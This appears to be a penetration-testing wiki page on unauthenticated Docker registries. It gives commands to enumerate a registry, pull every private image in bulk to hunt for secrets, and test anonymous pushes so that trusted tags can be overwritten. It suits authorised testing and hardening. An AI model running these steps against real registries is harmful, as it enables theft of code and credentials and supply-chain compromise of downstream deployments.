---
title: "Unauthenticated registry access: pulling and pushing without credentials"
description: "A registry that requires no authentication lets an attacker pull every private image, extracting proprietary code and baked-in secrets, and, where writes are also open, push modified images over existing tags. An open registry is both a data-exfiltration source and a supply-chain write primitive."
keywords:
  - unauthenticated registry
  - docker registry
  - anonymous pull
  - image push
  - supply chain
---

# Unauthenticated registry access

When a registry enforces no authentication, its contents are fully exposed: an attacker pulls any image to read its code and secrets, and if write operations are also unauthenticated, pushes a modified image over a tag that downstream systems trust. The pull side is immediate data exfiltration; the push side is a supply-chain compromise, because the next deployment of that tag runs the attacker's image.

Confirm read and test write:

```bash
R=http://<registry>:5000
curl -s $R/v2/_catalog                                 # lists repos => reads are open
# pull a private image directly (configure the daemon for an insecure registry if plain HTTP)
docker pull <registry>:5000/<repo>:<tag>
# test whether pushes are accepted (write-open registries allow this unauthenticated)
docker tag <repo>:<tag> <registry>:5000/<repo>:<tag>
docker push <registry>:5000/<repo>:<tag>               # success => supply-chain write
```

For a plain-HTTP registry, the client must be told to allow it, via the daemon's `insecure-registries` list, otherwise the pull or push is refused for using HTTP.

## From access to impact

```bash
# read side: extract all images and mine them for secrets
for repo in $(curl -s $R/v2/_catalog | jq -r '.repositories[]'); do
  for tag in $(curl -s $R/v2/$repo/tags/list | jq -r '.tags[]?'); do
    docker pull $R/$repo:$tag; done; done
# write side: push a backdoored image over a trusted tag (see Image backdooring)
```

## Exploitation notes

- Read-only open registries are still high-value: private images routinely embed cloud keys, source code, and internal service URLs; see [Secrets in image layers](secrets-in-image-layers.md).
- A write-open registry is a direct supply-chain attack: overwrite a base or application tag and wait for the next build or deploy to run the modified image; see [Image backdooring](image-backdooring.md) and [Base image poisoning](base-image-poisoning.md).
- Registries fronted by a token service may allow anonymous pulls of public repos but require a token for private ones; probe both a known-public and a guessed-private repo to tell which model is in use.

## References

- [Docker Registry HTTP API V2](https://distribution.github.io/distribution/spec/api/)
- [Docker: insecure registries](https://docs.docker.com/reference/cli/dockerd/#insecure-registries)
- [HackTricks: Docker registry](https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry)
